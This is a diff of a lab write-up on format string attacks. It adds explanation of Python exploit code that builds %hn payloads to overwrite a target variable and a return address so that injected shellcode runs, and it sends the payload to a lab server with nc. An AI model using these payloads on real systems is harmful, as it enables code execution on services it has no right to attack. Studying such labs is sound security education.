@@ -816,10 +816,10 @@ The objective of this task is to modify the value of the target variable that is
 I will be using %hn to modify the target address 2-bytes at a time. I am going to place 0xAAAABBBBCCCCCDDDD into 0x0000555555558010 two bytes at a time
 
 Our program is a 64-bit program so our address is a 8-byte address. Our machine is little-endian, so we break `0xAAAABBBBCCCCCDDDD` into four parts with four bytes each.
-- 0x0000555555558010   <= 0xDDDD
-- 0x0000555555558012   <= 0xCCCC
-- 0x0000555555558014   <= 0xBBBB
-- 0x0000555555558016   <= 0xAAAA
+- 0x0000555555558010   <-- 0xDDDD
+- 0x0000555555558012   <-- 0xCCCC
+- 0x0000555555558014   <-- 0xBBBB
+- 0x0000555555558016   <-- 0xAAAA
 
 The values written are cummulative, so when constructing our string, we have to start with the addresses that will store lower values.
 
@@ -846,17 +846,17 @@ For this task, I need to determine the total number of characters I would need t
 import sys
 
 #target = 0x0000555555558010
-t1      = 0x0000555555558016    # <= 0xAAAA
-t2      = 0x0000555555558014    # <= 0xBBBB
-t3      = 0x0000555555558012    # <= 0xCCCC
-t4      = 0x0000555555558010    # <= 0xDDDD
+t1      = 0x0000555555558016    # <-- 0xAAAA
+t2      = 0x0000555555558014    # <-- 0xBBBB
+t3      = 0x0000555555558012    # <-- 0xCCCC
+t4      = 0x0000555555558010    # <-- 0xDDDD
 
 # Create format string
 # I padded zeros to keep the lenght at 16-bytes
-content = ("%.0043690x%42$hn").encode('latin-1')
-content += ("%.0004369x%43$hn").encode('latin-1')
-content += ("%.0004369x%44$hn").encode('latin-1')
-content += ("%.0004369x%45$hn").encode('latin-1')
+content  = ("%.0043690x%42$hn").encode('latin-1')    # <-- 0xAAAA
+content += ("%.0004369x%43$hn").encode('latin-1')    # <-- 0xBBBB
+content += ("%.0004369x%44$hn").encode('latin-1')    # <-- 0xCCCC
+content += ("%.0004369x%45$hn").encode('latin-1')    # <-- 0xDDDD
 
 content += (t1).to_bytes(8,byteorder='little')
 content += (t2).to_bytes(8,byteorder='little')
@@ -952,9 +952,9 @@ r3 = 0x00007fffffffe0d8 + 4     # <-- 0x7fff
 r4 = 0x00007fffffffe0d8 + 6     # <-- 0x0000
 
 # Create format string
-content = ("%.0032767x%40$hn").encode('latin-1')
-content += ("%.0025049x%41$hn").encode('latin-1')
-content += ("%.0007719x%42$hn").encode('latin-1')
+content  = ("%.0032767x%40$hn").encode('latin-1')    # <-- 0x7fff
+content += ("%.0025049x%41$hn").encode('latin-1')    # <-- 0xe1d8
+content += ("%.0007719x%42$hn").encode('latin-1')    # <-- 0xffff
 
 # Append addresses
 content += (r3).to_bytes(8,byteorder='little')
@@ -962,7 +962,7 @@ content += (r1).to_bytes(8,byteorder='little')
 content += (r2).to_bytes(8,byteorder='little')
 
 # determine the size of content before adding the shellcode
-#print(f"size of content before shellcode = {len(content)}")    # -> 72 = 0x48
+#print(f"size of content before shellcode = {len(content)}")    # --> 72 = 0x48
 
 # shellcode
 content += shellcode
@@ -992,7 +992,53 @@ cat badfile | nc -w2 10.9.0.5 9090
 <summary>Code explanation</summary>
 <div markdown="1">
 
+I write out the addresses I would be needing for easy reference. I also map out the shellcode address to the return addresses where they will be stored. Remember our machine is little endian.
 
+```python
+# return address    = 0x00007fffffffe0d8
+# buffer address    = 0x00007fffffffe190
+# shellcode address = 0x00007fffffffe190 + 0x48 = 0x00007fffffffe1d8
+
+r1 = 0x00007fffffffe0d8         # <-- 0xe1d8
+r2 = 0x00007fffffffe0d8 + 2     # <-- 0xffff
+r3 = 0x00007fffffffe0d8 + 4     # <-- 0x7fff
+r4 = 0x00007fffffffe0d8 + 6     # <-- 0x0000
+```
+
+I use the below block of code to initially print the offset form the start of the payload where the shellcode will reside in memory. After running the program, I get a value of 72.
+
+```python
+# determine the size of content before adding the shellcode
+#print(f"size of content before shellcode = {len(content)}")    # --> 72 = 0x48
+```
+
+I can now do the following:
+- determine the shellcode address by adding the offset to the buffer address.
+- use the calculated address to build the format specifiers
+
+I create the format string by starting with the lowest value since the %x is cummulative. 0x7fff is the smallest value, so I atart with this and increment till i have all the required values. I also place them into their respective addresses at the calculated offset.
+
+```python
+# Create format string
+content  = ("%.0032767x%40$hn").encode('latin-1')    # <-- 0x7fff
+content += ("%.0025049x%41$hn").encode('latin-1')    # <-- 0xe1d8
+content += ("%.0007719x%42$hn").encode('latin-1')    # <-- 0xffff
+```
+
+The initial offset is 34; however, by keeping the format sepcifiers to a constant length of 16-bytes, and knowing I am writing to 3 addresses, the total length of the format specifiers will be 16 * 3 = 48-bytes. But our program is 64-bit meaning each address is 8-bytes. So to get the offset of the first address, we do 34 + (48 / 8) = 34 + 6 = 40
+
+The addresses come immediately after the format specifiers and are arranged in a way that the values go into the correct addresses as previously mapped.
+
+```python
+# Append addresses
+content += (r3).to_bytes(8,byteorder='little')
+content += (r1).to_bytes(8,byteorder='little')
+content += (r2).to_bytes(8,byteorder='little')
+```
 
 </div></details>
 
+
+<br>
+
+### Mitigating Format String Attack
